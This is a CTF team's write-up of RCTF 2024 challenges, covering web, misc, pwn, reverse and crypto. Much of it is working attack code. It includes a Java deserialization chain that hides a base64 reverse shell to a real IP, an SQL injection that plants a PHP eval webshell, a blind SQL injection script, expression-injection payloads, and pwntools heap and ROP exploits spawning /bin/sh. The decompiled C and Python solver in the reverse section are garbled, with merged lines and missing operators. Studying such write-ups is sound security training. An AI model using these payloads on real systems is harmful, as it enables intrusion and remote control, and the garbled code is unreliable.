@@ -1,0 +1,1227 @@
+---
+title: 2024 RCTF SU WriteUp
+tags: ["RCTF"]
+date: 2024-05-27 23:15:34
+slug: "rctf-2024-su-wu"
+---
+
+本次RCTF我们 SU 取得了 第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。
+
+以下是我们 SU 本次 2024 RCTF的 writeup。
+
+<!--more-->
+
+# web
+
+## OpenYourEyesToSeeTheWorld
+
+根据题目源码易知是JNDI中的LDAP注入
+
+![img](46c26df9a8577c9cdf77aae4af49f1f1.png)
+
+查看容器中java版本，高版本一般都是打反序列化
+
+![img](09dbc0f7779d7896470f8ffc876d936d.png)
+
+依赖只有SpringBoot，那只剩下Jackson原生反序列化这条链子
+
+![img](1ae88573acbc157fb7bf1443a68dcb25.png)
+
+而如何触发obj.decodeObject()方法 和 绕过检测成了关键
+
+![img](65e10ec43957abff3dbb183248e33bd3.png)
+
+![img](421edc7a9ebe6cf69aa23245d5d0ea01.png)
+
+绕过检测可以用Unicode编码绕过例如`\u003d` 替代 `=`等
+
+obj.decodeObject()方法有三处调用
+
+![img](ffdea279dbcf5db7ff9c077e7124e3f5.png)
+
+c_lookup() 方法有5处调用
+
+![img](511dc91db5ed3d0b02f1151d7a97bf92.png)
+
+c_resolveIntermediate_nns() 方法有3处调用
+
+![img](54f66b7db91c9b25a2942b01953f7055.png)
+
+动调发现正常的payload 无法达到 c_resolveIntermediate_nns() 方法，因为tail 变量为空
+
+![img](caefee5ee6854594b0e273f148ddbc46.png)
+
+进入p_parseComponent() 方法，查看tail 属性的解析
+
+![img](a2d3802e41f4223abd0262e4f48937a0.png)
+
+![img](88465060dc6397b6e62a5bfca4b1d89f.png)
+
+了解这些后，即可构造payload了
+
+```JSON
+{"ip":"<vps>","port":9999,"searchBase":"dc\u003djavasec,dc\u003deki,dc\u003dxyz\u002f0","filter":"\u0028cn\u003dtest\u0029"}
+```
+
+生成链子的脚本
+
+```Java
+package ctf;
+
+
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.*;
+import org.springframework.aop.framework.AdvisedSupport;
+import javax.management.BadAttributeValueExpException;
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.*;
+import java.util.Base64;
+
+public class Poc0 {
+
+    public static void main(String[] args) throws Exception {
+
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
+        ctClass0.removeMethod(writeReplace);
+        ctClass0.toClass();
+
+        CtClass ctClass = pool.makeClass("a");
+        CtClass superClass = pool.get(AbstractTranslet.class.getName());
+        ctClass.setSuperclass(superClass);
+        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
+        constructor.setBody("Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMTk5LjM2LjE1OC85MDAyIDA+JjE=}|{base64,-d}|{bash,-i}\");");
+        ctClass.addConstructor(constructor);
+        byte[] bytes = ctClass.toBytecode();
+
+        Templates templatesImpl = new TemplatesImpl();
+        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
+        setFieldValue(templatesImpl, "_name", "test");
+        setFieldValue(templatesImpl, "_tfactory", null);
+        //利用 JdkDynamicAopProxy 进行封装使其稳定触发
+        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
+        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
+        cons.setAccessible(true);
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(templatesImpl);
+        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
+        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
+        POJONode jsonNodes = new POJONode(proxyObj);
+
+        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
+        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
+        val.setAccessible(true);
+        val.set(exp,jsonNodes);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
+        objectOutputStream.writeObject(exp);
+        objectOutputStream.close();
+        String res = Base64.getEncoder().encodeToString(barr.toByteArray());
+        System.out.println(res);
+
+    }
+    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
+        Field f = obj.getClass().getDeclaredField(field);
+        f.setAccessible(true);
+        f.set(obj, arg);
+    }
+}
+```
+
+将生成好的链子放到HackerLDAPRefServer.java即可
+
+![](fb0da3743efd604bf45284812d2b5652.png)
+
+参考链接：
+
+https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload
+
+https://goodapple.top/archives/696
+
+https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi-referenceldap%E6%94%BB%E5%87%BB
+
+https://github.com/kxcode/JNDI-Exploit-Bypass-Demo
+
+  
+
+## Proxy
+
+`Proxy.php`其中的`$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'];`可被伪造
+
+导致可以控制其返回内容
+
+注入点在`$ProxyObj->body`(其他地方也可以注入，但是会因为后面的sql语句执行失败，导致无法写入文件)
+
+vps上面放入内容
+
+```Bash
+<?php 
+echo "a');ATTACH DATABASE '/var/www/html/shell.php' AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES ('<?php eval(\$_GET[1]);?>');--";
+?>
+```
+
+修改Host头
+
+![](86aa97f47c21e02ec270422ab6341c24.png)
+
+访问`/shell.php?1=system('tac flag.php');`
+
+![](c55273600d978e3c1f63652ef1e8013e.png)
+
+## color(Solved)
+
+Js反混淆分析
+
+![](c024ed1135e6e390d941dfa607010b77.png)
+
+先访问js然后f12找到加密解密函数然后打断点之后再访问根目录玩游戏可以看到密钥
+
+![](a.png)
+
+然后编写脚本玩游戏
+
+```Python
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import base64
+import requests
+import json
+
+
+def encrypt_data(data, key, iv):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    encrypted_data = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
+    return base64.b64encode(encrypted_data).decode('utf-8')
+
+
+def decrypt_data(encrypted_data, key, iv):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted_data = unpad(cipher.decrypt(base64.b64decode(encrypted_data)), AES.block_size)
+    return decrypted_data.decode('utf-8')
+
+
+def post_data(session, url, data):
+    try:
+        response = session.post(url=url, data=data)
+        response.raise_for_status()
+        return response.text
+    except requests.exceptions.RequestException as e:
+        print(f"Network error occurred: {e}")
+        return None
+
+
+def main():
+    key = b'88b4dbc541cd57f2d55398e9be3e61ae'
+    iv = b'41cd57f2d55398e9'
+    url = "http://124.71.164.28:10088/final/game.php"
+    session = requests.Session()
+
+    for i in range(1, 501):
+        print(i)
+        encrypted_action = encrypt_data("4", key, iv)
+        data1 = {
+            "action": "3wrg4Ich1RsKFUUPmU0vlw==",
+            "rangeNum": encrypted_action
+        }
+        response_text = post_data(session, url, data1)
+        if response_text:
+            parsed_data = json.loads(response_text)
+            pos = decrypt_data(parsed_data["data"], key, iv)
+
+            encrypted_pos = encrypt_data(pos, key, iv)
+            data2 = {
+                "action": "s03/Zr+K7nTxLc2aiHJQcg==",
+                "pos": encrypted_pos
+            }
+            response_text = post_data(session, url, data2)
+            if response_text:
+                parsed_data = json.loads(response_text)
+                status = decrypt_data(parsed_data["data"], key, iv)
+                print(status)
+
+    data3 = {
+        "action": "IMYZakV42qGIPRWdg/WfFg=="
+    }
+    response_text = post_data(session, url, data3)
+    if response_text:
+        print(response_text)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+![](b78bb6863e56b1c86be4bfd3feb0a5d5.png)
+
+解密secret
+
+![](b78bb6863e56b1c86be4bfd3feb0a5d5.png)
+
+得到源码`secr3tcolor.zip`
+
+下载下来，发现`final/game.php`中，其中`action`需要进行加密传送
+
+```PHP
+<?php 
+$key = "88b4dbc541cd57f2d55398e9be3e61ae";
+$iv = "41cd57f2d55398e9";
+function encoder($input){
+    global $key,$iv;
+    return encrypt($input, $key, $iv);
+}
+function encrypt($plaintext, $key, $iv) {
+    $encrypted = openssl_encrypt($plaintext, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
+    return base64_encode($encrypted);
+}
+echo encoder("checkImage"); 
+?>
+```
+
+```PHP
+$upload_image = file_get_contents($_FILES["image"]["tmp_name"]);
+echo getimagesize($upload_image);
+```
+
+存在侧信道漏洞，但是可控点在文件上传的内容
+
+基于https://github.com/synacktiv/php_filter_chains_oracle_exploit脚本进行修改
+
+![](cabab988fe4d41430594cfc3ae8c6511.png)
+
+![](7d652a7e19399a3c53683aa792a38bb7.png)
+
+运行即可
+
+`python3 filters_ chain_ oracle_exploit.py --target url/final/game.php --verb POST --parameter 0 --file /flag.txt`
+
+## **what_is_love** **(Solved)**
+
+key1进行sql注入，需要前后分开爆，payload不能超过52位
+
+```Python
+import requests
+import urllib
+
+url = 'http://1.94.13.174:10088/key1'
+headers = {
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+flag = ''
+list="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_ {}!@$%&*()#."
+#' || love_key REGEXP BINARY '^{}'#
+for i in range(1, 40):
+    for j in list:
+        data = {
+            "key1":"' || love_key REGEXP BINARY '{}$'#".format(j+flag)
+        }
+        print(data)
+        r = requests.post(url, headers=headers, data=data)
+        if "success" in r.text:
+            flag = j+flag
+            print(flag)
+            break
+        if j == '.':
+            print(flag)
+            exit()
+```
+
+![](c460eab80d6db0ff96dac59993a8ca9e.png)
+
+![](53f255d839ade35227ea9c02e782517b.png)
+
+key2当输入的love_time为字符串时，先经过Number函数处理之后就会变为NaN，然后再经过parseInt函数处理之后saltedSecret就会变为NaN，所以此时saltedSecret的值可控了，就可以用来伪造token了
+
+![](c55273600d978e3c1f63652ef1e8013e.png)
+
+伪造token
+
+```Python
+const crypto = require("crypto");
+const hash = (data) => crypto.createHash("sha256").update(data).digest("hex");
+
+data="{\"username\":\"lover\",\"love_time\":null,\"have_lovers\":true}"
+saltedSecret=NaN
+console.log(Buffer.from(data).toString("base64") + "." + hash(`${data}:${saltedSecret}`))
+```
+
+![](25cc211d6b16c26d5e69e44f5042a2fc.png)
+
+## nosandbox
+
+JEXL 表达式注入 ，BAN 了很多东西  
+根据官方文档 能利用的 只有new 创建新实例，没有T() 类型表达式，而new() 也被ban了，但是可以通过加空格new () 进行绕过
+
+![image](image-20240528103919-7oq843z.png)
+
+根据一些之前`SpEL表达式注入`​ 的 payload ，构造出如下payload读取 **​`/proc/self/cmdline`​**​
+
+```Java
+expression=new+('java.util.Scanner',new+('java.io.FileReader','/proc/self/cmdline')).useDelimiter('\\Z').next()
+```
+
+![image](image-20240528104010-f8x2byk.png)
+
+读取`nosandbox.jar`​ 但因为存在编码问题，无法反编译，但可以看到其依赖
+
+![image](image-20240528104020-d8i3qhc.png)
+
+根据**[LandGrey师傅文章](https://landgrey.me/blog/15/)** 思路，表达式注入也能打反序列化
+
+![image](image-20240528104029-f0db870.png)
+
+但其中调用静态方法 `org.springframework.util.SerializationUtils.deserialize`​ 反序列化思路，我用 JEXL 表达式我想不出如何能调用，只能去寻找写文件再反序列化读取的方法
+
+看到[Memoryshell-JavaALL](https://github.com/achuna33/Memoryshell-JavaALL) 项目发现可以用如下表达式将字符串写入文件
+
+```java
+${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileWriter","/tmp/hh.txt").append("<>").close()}
+```
+
+我一开始是将序列化数据进行Unicode编码成字符串再写入，但是存在写入文件与源文件不一致问题
+
+向调用其他方法，在JEXL 表达式中我也想不出实例化`byte[]`​ 数组方法，因为`[]`​ 它会自动执行类型转换
+
+![image](image-20240528104211-b4ois2b.png)
+
+通过一番寻找后 终于在[官方文档](https://docs.oracle.com/javase/8/docs/api/java/io/DataOutputStream.html) 找到了DataOutputStream.write(int b) 方法，用int 型就能写入数据
+
+一开始用的是jackson原生反序列化这条。链，打了两遍都没成功
+
+遂改用P神的CC6链子
+
+![image](image-20240528104218-n89rt30.png)
+
+编写py脚本，写入数据
+
+```Python
+import requests
+import time
+
+expression = [
+    -84,
+    -19,
+    ...
+]
+
+# 发送 POST 请求
+url = "http://124.70.143.104:10088/calculate"
+# url = "http://local:10119/calculate"
+
+headers = {
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+}
+
+for i in range(len(expression)):
+    data = {
+        "expression": "new ('java.io.DataOutputStream',(new ('java.io.FileOutputStream','/tmp/cc666',true))).write("
+        + str(expression[i])
+        + ")"
+    }
+    response = requests.post(url, data=data, headers=headers)
+```
+
+再用如下payload即可读取文件反序列化
+
+![image](image-20240528104237-t4btbiw.png)
+
+![image](image-20240528104241-1htoamp.png)
+
+
+
+# misc
+
+## Logo: Signin (Solved)
+
+![](e929385cbdd238f4d6d62dcd12872cdb.png)
+
+![](e1b235340242f6fbb7d46a4c82e6432a.png)
+
+```Shell
+logo = """
+####################################################################################################
+############################ # #####################################################################
+####   ##       ########### ## ##          ###########                   ########             ######
+####   ##           #########               ##########                   ######                  ###
+####   ########       ########     ##########################    #############    ############    ##
+####   ###########     ######    ###########   ##############    ############    ###################
+###    #############    #####    ###########    #############    ############    ###################
+###    ##############   ####    #############   #############   #############    ###################
+###    ##############    ###    #############    ############   ##############     #################
+###    ##############    ###   ###############   ############   ###############      ###############
+###    ##############   ####   ###############   ############   #################      #############
+###    #############    ####   ###############   ###########    ####################      ##########
+###    ############    #####   ###############   ###########    ######################     #########
+###    ####           ######   ##############    ###########    ########################     #######
+###    ####         ########    #############    ###########    ##########################    ######
+###    #########    #########   #############   ############    ##########################    ######
+###    ##########    ########    ###########   #############    ##########################    ######
+###    ###########    ########    #########    #############    #############    #########    ######
+###    ############   #########     ######   ############       ###############     ####     #######
+###   ############## ###########         ############                  #########           #########
+#### ###############################  ##############################################    ############
+####################################################################################################
+"""
+```
+
+## s1ayth3sp1re (Solved)
+
+  
+
+根据分数 3000 分来，使用jadx反编译. 搜索 3000。在代码中。找到 相关的比较.
+
+![](bbf3f404a640adef521efd8c4cdfc7ad.png)
+
+  
+
+跳过去发现 是一段字符串加密:
+
+![](7da9e6da6a62dedcc190228819151942.png)
+
+  
+
+其中有一些引用，找到之后，写加密脚本:
+
+```Python
+l = [164, 158, 95, 107, 4, 215, 108, 115, 5, 8, 25, 57, 41, 236, 231, 17, 85]
+l1 = [246, 221, 11, 45, 127 , 148, 45, 36, 70, 73, 78, 8, 98, 141, 140, 112, 40]
+
+for i in range(len(l)):
+    print(chr(l[i] ^ l1[i]), end="")
+
+# RCTF{********}
+```
+
+## sec-image （solved ）
+
+光栅
+
+用https://github.com/AabyssZG/Raster-Terminator这个工具分别对x和y进行爆破，x和y都取2的部分，
+
+根据前四个字符RCTF分别判断x，y的读取顺序（全是小写，o全部是0）
+
+# pwn
+
+## Taskgo (Solved)
+
+go语言的条件竞争，可以通过条件竞争溢出money然后通过GOD功能泄露地址。之后在GOD功能中通过条件竞争修改结构体堆块，从而劫持LOG函数调用的指针为bockdoor读取/flag的内容。
+
+```Python
+from pwn import *
+r = process("./ctf")
+r = remote("1.94.107.129",10088)
+elf = ELF("./ctf")
+
+context(arch="amd64",os="linux",log_level="debug")
+context.terminal = ['terminator','-x','sh','-c']
+
+
+def meau(index):
+    r.sendlineafter(">> ",str(index))
+
+def wooden():
+    meau(1)
+    meau(1)
+
+def silver():
+    meau(1)
+    meau(2)
+
+def golden():
+    meau(1)
+    meau(3)
+
+def buyms(index):
+    meau(2)
+    meau(1)
+    meau(index)
+
+def dropms():
+    meau(2)
+    meau(2)
+
+def learningms():
+    meau(2)
+    meau(3)
+
+def god():
+    meau(2)
+    meau(1337)
+
+r.sendlineafter("name: ","/flag")
+golden()
+
+buyms(1)
+learningms()
+dropms()
+
+buyms(2)
+learningms()
+dropms()
+
+buyms(3)
+learningms()
+
+god()
+r.recvuntil("0x")
+r.recvuntil("0x")
+backdoor = int(r.recv(12),16)+0x250
+success("backdoor = "+hex(backdoor))
+
+r.sendline("2")
+meau(1337)
+wooden()
+dropms()
+r.sendlineafter("visit.","6")
+r.sendlineafter("Comments: ",b'a'*0x28+p64(backdoor)[:-2])
+
+r.interactive()
+```
+
+## Mine (Solved)
+
+Wasm pwn，当使用U开了一个格子之后，输入除了U或M的字母，可以更改矩阵的内容。当修改到最后一行的前四个格子的时候会产生溢出覆盖掉原先name的指针。由于name的地址和flag的地址较近，可以直接溢出修改最后一位为flag的地址，然后在输出name的时候就会泄露flag。
+
+```Python
+from pwn import *
+r = remote("123.60.161.30",10088)
+elf = ELF("./minesweeper")
+
+context(arch="amd64",os="linux",log_level="debug")
+context.terminal = ['terminator','-x','sh','-c']
+
+r.sendlineafter("Your Name:","a")
+r.sendlineafter("mark): ","0 0 U")
+r.sendlineafter("mark): ","0 0 A")
+
+for i in range(15):
+    for j in range(16):
+        sleep(0.02)
+        r.sendlineafter("]:","n")
+
+r.sendlineafter("]:",b"y "+p8(0xb0))
+
+for i in range(15):
+    sleep(0.02)
+    r.sendlineafter("]:","n")
+
+r.interactive()
+```
+
+## Dwebp (Solved)
+
+可以直接非预期掉，使用webp解析图片的功能一可以不用，作者自己添加的漏洞中存在未初始化漏洞。可以通过申请超出大小限制的堆块来向main_arena中写入数据，可以直接写到IO_2_1_stderr上，exit的时候劫持IO。
+
+```Python
+from pwn import *
+r = process("./dwebp")
+r = remote("123.60.91.255",10088)
+elf = ELF("./dwebp")
+libc = ELF("./libc.so.6")
+context(arch="amd64",os="linux",log_level="debug")
+context.terminal = ['terminator','-x','sh','-c']
+
+
+def meau(index):
+    r.sendlineafter("> ",str(index))
+
+def add(index,size,content):
+    meau(2)
+    meau(index)
+    r.sendlineafter("feedback?",str(size))
+    r.sendlineafter("feedback:",content)
+
+def adds(index,size):
+    meau(2)
+    meau(index)
+    r.sendlineafter("feedback?",str(size))
+
+def show(index):
+    meau(3)
+    meau(index)
+
+def delete(index):
+    meau(4)
+    meau(index)
+
+def edit(index,content):
+    meau(5)
+    meau(index)
+    r.sendlineafter("feedback:",content)
+
+add(1,0x500,"a"*0x8)
+add(2,0x100,"a"*0x8)
+
+delete(1)
+delete(2)
+
+add(1,0x440,"a"*6)
+
+show(1)
+libc_base = u64(r.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00")) - 0x21B110
+success("libc_base = "+hex(libc_base))
+
+delete(1)
+
+adds(1,0x10000)
+adds(1,0x10000)
+adds(1,0x1000)
+
+pop_rdi_ret = libc_base+0x2a3e5
+pop_rsi_ret = libc_base+0x2be51
+pop_rdx_ret = libc_base+0x170337
+pop_rax_ret = libc_base+0x45eb0
+syscall_ret = libc_base+0x91316
+mov_rsp_rdx_ret = libc_base+0x5a120
+
+IO_2_1_stderr = libc_base+libc.symbols['_IO_2_1_stderr_']
+arena_addr = libc_base+0x21b100
+
+rops = p64(pop_rdi_ret)+p64(libc_base+0x21b120)+p64(pop_rsi_ret)+p64(0)+p64(pop_rdx_ret)+p64(0)+p64(pop_rax_ret)+b'a'*6+p64(59)+p64(syscall_ret)
+
+payload = p64(1)+p64(2)
+payload += b'/bin/sh\x00'
+payload += p64(1)+p64(libc_base+0x21b138)
+payload += rops
+payload = payload.ljust(0xe0,b'\x00')
+payload += p64(libc_base+0x21b1f0)
+payload += p64(0)*2
+payload += p64(mov_rsp_rdx_ret)
+payload = payload.ljust(320,b'\x00')
+
+for i in range(20,61):
+    payload += p64(arena_addr)*2
+    arena_addr = arena_addr+0x10
+    
+payload += p64(0)
+payload += p64(0x10)
+payload += p64(libc_base+0x21ac80)
+payload += p64(0)
+payload += p64(1)
+payload += p64(0x21000)*2
+payload += p64(libc_base+0xa7490)
+payload += p64(libc_base+0x1d9b11)*2
+payload += p64(0)*3
+payload += p64(1)
+payload += p64(2)
+payload += p64(libc_base+0x2226d8)
+payload += p64(0)
+payload += p64(0xffffffffffffffff)
+payload += p64(libc_base+0x1e1300)
+payload += p64(0)
+payload += p64(libc_base+0x217820)
+payload += p64(libc_base+0x217d60)
+payload += p64(libc_base+0x217de0)
+payload += p64(libc_base+0x218660)
+payload += p64(libc_base+0x217ba0)
+payload += p64(libc_base+0x217b20)
+payload += p64(0)
+payload += p64(libc_base+0x218320)
+payload += p64(libc_base+0x218380)
+payload += p64(libc_base+0x218400)
+payload += p64(libc_base+0x2184c0)
+payload += p64(libc_base+0x218540)
+payload += p64(libc_base+0x2185a0)
+payload += p64(libc_base+0x1bf3c0)
+payload += p64(libc_base+0x1be4c0)
+payload += p64(libc_base+0x1beac0)
+payload += p64(libc_base+0x1da1c2)*13
+payload += p64(0)*3
+payload += p64(IO_2_1_stderr)
+payload += p64(0)*3
+
+fake_IO_FILE = p64(0)*12
+fake_IO_FILE = fake_IO_FILE.ljust(0x68, b'\x00')
+fake_IO_FILE += p64(0)
+fake_IO_FILE = fake_IO_FILE.ljust(0x88, b'\x00')
+fake_IO_FILE += p64(IO_2_1_stderr)
+fake_IO_FILE = fake_IO_FILE.ljust(0xa0, b'\x00')
+fake_IO_FILE += p64(libc_base+0x21b110)
+fake_IO_FILE = fake_IO_FILE.ljust(0xc0, b'\x00')
+fake_IO_FILE += p64(1)
+fake_IO_FILE = fake_IO_FILE.ljust(0xd8, b'\x00')
+fake_IO_FILE += p64(libc_base+0x2170f0)
+fake_IO_FILE += p64(0xfbad2887)
+
+payload += fake_IO_FILE
+edit(1,payload)
+meau(6)
+
+r.interactive()
+```
+
+# reverse
+
+  
+
+## bloker_vm
+
+程序的整体逻辑是父进程创建了子进程，且接管子进程的异常相关信息并处理，相当于父进程是作为子进程的调试器，这样我们直接调试子进程了。
+
+父进程逻辑
+
+```C
+int sub_551A10(){
+  HMODULE ModuleHandleW; // eaxchar v1; // alchar LastError; // alint v4; // eaxchar v5; // [esp+0h] [ebp-A5Ch]char v6; // [esp+0h] [ebp-A5Ch]char v7; // [esp+0h] [ebp-A5Ch]unsigned int k; // [esp+320h] [ebp-73Ch]void *lpBaseAddress; // [esp+32Ch] [ebp-730h]size_t j; // [esp+338h] [ebp-724h]size_t i; // [esp+344h] [ebp-718h]int v12; // [esp+350h] [ebp-70Ch]int v13; // [esp+35Ch] [ebp-700h]char Buffer[264]; // [esp+3A4h] [ebp-6B8h] BYREF
+  CONTEXT Context; // [esp+4ACh] [ebp-5B0h] BYREFstruct _DEBUG_EVENT DebugEvent; // [esp+780h] [ebp-2DCh] BYREFstruct _PROCESS_INFORMATION ProcessInformation; // [esp+7E8h] [ebp-274h] BYREFstruct _STARTUPINFOW StartupInfo; // [esp+800h] [ebp-25Ch] BYREF
+  WCHAR Filename[262]; // [esp+84Ch] [ebp-210h] BYREF__CheckForDebuggerJustMyCode(&unk_55D0AC);j_memset(Filename, 0, 0x208u);
+  StartupInfo.cb = 68;j_memset(&StartupInfo.lpReserved, 0, 0x40u);memset(&ProcessInformation, 0, sizeof(ProcessInformation));j_memset(&DebugEvent, 0, sizeof(DebugEvent));j_memset(&Context, 0, sizeof(Context));j_memset(Buffer, 0, 0xFFu);sub_5510EB("please input your flag:\n", v5);sub_551037("%s", (char)Str);if ( j_strlen(Str) != 25 )exit(0);
+  Str[25] = 0;
+  ModuleHandleW = GetModuleHandleW(0);GetModuleFileNameW(ModuleHandleW, Filename, 0x104u);if ( CreateProcessW(0, Filename, 0, 0, 0, 3u, 0, 0, &StartupInfo, &ProcessInformation) ){
+    v13 = -3;
+    v12 = 1;while ( 1 ){j_memset(&DebugEvent, 0, sizeof(DebugEvent));if ( !WaitForDebugEvent(&DebugEvent, 0xFFFFFFFF) )break;if ( DebugEvent.dwDebugEventCode == 1 ){switch ( DebugEvent.u.Exception.ExceptionRecord.ExceptionCode ){case 0xC0000094:for ( i = 0; i < j_strlen(Str); ++i )// EXCEPTION_INT_DIVIDE_BY_ZERO
+              Str[i] ^= 0x7Du;
+            Context.ContextFlags = 65543;GetThreadContext(ProcessInformation.hThread, &Context);
+            Context.Eip += 2;SetThreadContext(ProcessInformation.hThread, &Context);break;case 0xC0000096:for ( j = 0; j < j_strlen(Str); ++j )// EXCEPTION_PRIV_INSTRUCTION
+              byte_55B26C[j] = (Str[j] << 6) | (Str[j]  2) & 0x3F;
+            Context.ContextFlags = 65543;GetThreadContext(ProcessInformation.hThread, &Context);++Context.Eip;SetThreadContext(ProcessInformation.hThread, &Context);break;case 0xC000008E:
+            Context.ContextFlags = 65543;       // EXCEPTION_FLT_DIVIDE_BY_ZEROGetThreadContext(ProcessInformation.hThread, &Context);
+            Context.Eip += 4;SetThreadContext(ProcessInformation.hThread, &Context);break;case 0xC0000005:
+            v4 = j_strlen(Str);                 // EXCEPTION_ACCESS_VIOLATIONsub_55100F((int)byte_55B26C, v4, (int)aThisisyoursecr, 18);
+            Context.ContextFlags = 65543;GetThreadContext(ProcessInformation.hThread, &Context);
+            Context.Eip += 2;SetThreadContext(ProcessInformation.hThread, &Context);break;case 0x80000003:if ( ++v13 < 0 )                    // EXCEPTION_BREAKPOINT{if ( v13 == -1 ){
+                Context.ContextFlags = 65543;GetThreadContext(ProcessInformation.hThread, &Context);
+                lpBaseAddress = (void *)Context.Eip;SetThreadContext(ProcessInformation.hThread, &Context);ReadProcessMemory(ProcessInformation.hProcess, lpBaseAddress, Buffer, 0xD6u, 0);for ( k = 0; k < 0xD6; ++k )
+                  Buffer[k] ^= 0x44u;WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, Buffer, 0xD6u, 0);}}else{
+              v12 = ((unsigned __int8)byte_55B26C[v13] == dword_55B018[v13]) & (unsigned __int8)v12;}break;}}else if ( DebugEvent.dwDebugEventCode == 5 ){goto LABEL_34;}ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, 0x10002u);}
+    LastError = GetLastError();sub_5510EB("WaitForDebugEvent() failed! [%d]n", LastError);
+LABEL_34:sub_5510EB("\n", v6);if ( v12 )return sub_5510EB("Congratulations! flag is your input\n", v7);elsereturn sub_5510EB("try again\n", v7);}else{
+    v1 = GetLastError();return sub_5510EB("CreateProcess() failed! [%d]n", v1);}}/* Orphan comments:
+EXCEPTION_INT_DIVIDE_BY_ZERO
+*/
+```
+
+关键在于其中的几个处理子进程异常的逻辑
+
+![](fd3463bb362f4d232b2a7d0a4a2ce55b.png)
+
+子进程中就触发不同的异常来推动父进程的执行，比如下面开始的CC就是一个软件断点异常
+
+![](06e323b3c9af628266176d7bb501f9cc.png)
+
+这样父进程中就会接管这个异常，并对子进程中的代码进行解密
+
+![](3e74199dbbf6e1890124459e4c20f885.png)
+
+剩下的流程可以直接调试父进程来确定，
+
+先对输入进行了异或
+
+![](3cd1bb2e6c5a427d115600c3f0d27f9f.png)
+
+接着进行移位运算
+
+![](86aa97f47c21e02ec270422ab6341c24.png)
+
+然后是一个rc4
+
+![](86aa97f47c21e02ec270422ab6341c24.png)
+
+最后对比
+
+![](86aa97f47c21e02ec270422ab6341c24.png)
+
+一层一层逆向解密即可
+
+```Python
+enc = [0x00000080, 0x00000005, 0x000000E3, 0x0000002F, 0x00000018, 0x0000002F, 0x000000C5, 0x0000008C, 0x00000025, 0x00000070, 0x000000BC, 0x00000005, 0x0000001C, 0x0000004F, 0x000000F2, 0x00000002, 0x000000E5, 0x0000003E, 0x00000002, 0x0000002F, 0x000000E5, 0x00000011, 0x000000A3, 0x000000C0, 0x00000000]print(len(enc))
+x1 = [0xD8, 0x19, 0x3A, 0x72, 0x0A, 0xBB, 0xDE, 0xD8, 0xB1, 0x24, 0x2E, 0x1E, 0xC9, 0xDA, 0xA6, 0x93, 0xF0, 0x25, 0x56, 0xF8, 0xF2, 0x07, 0x36, 0x90, 0x95]
+x2 = bytes.fromhex("93939393939393939393939393939393939393939393939393")
+x = [x1[i]^x2[i] for i in range(len(x1))]print(x)
+enc = [enc[i]^x[i] for i in range(len(enc))] 
+print(enc)for i in range(len(enc)):
+    enc[i] = (enc[i]  6) | (enc[i] << 2);
+    enc[i] &= 0xfffor i in range(len(enc)):
+    enc[i] ^= 0x7Dprint(len(enc))print(bytes(enc))
+```
+
+  
+
+## 2048
+
+初始10000分，最终要1000000分，每次赢一盘最多加当前的分数
+
+大概玩十几遍2048就可以了（泪目）
+
+![](968092825888ad31e980ebd3d5450648.png)
+
+  
+
+# Crypto
+
+## SignSystem
+
+$$ \begin{aligned} k \cdot s &= hm + x \cdot r \\ \text{msb} \| k \| \text{lsb} &= (hm + x \cdot r) \cdot s^{-1} \end{aligned} $$
+$$
+\begin{aligned}
+&\text{msb}: 8\text{-bit}, \quad \text{lsb}: 2\text{-bit} \\
+&x: 160\text{-bit}, \quad k: 150\text{-bit}
+\end{aligned}
+$$
+已知s,r,hm。可爆破msb和lsb，用19组来尝试规约出k。这里由于数据和lsb的位数有关，直接爆破lsb默认为2bit（2，3两个取值）。还有就是当msb为较大的8bit数时概率较高，所以简单做移位，然后原始的格就能出x然后伪造目标签名。
+
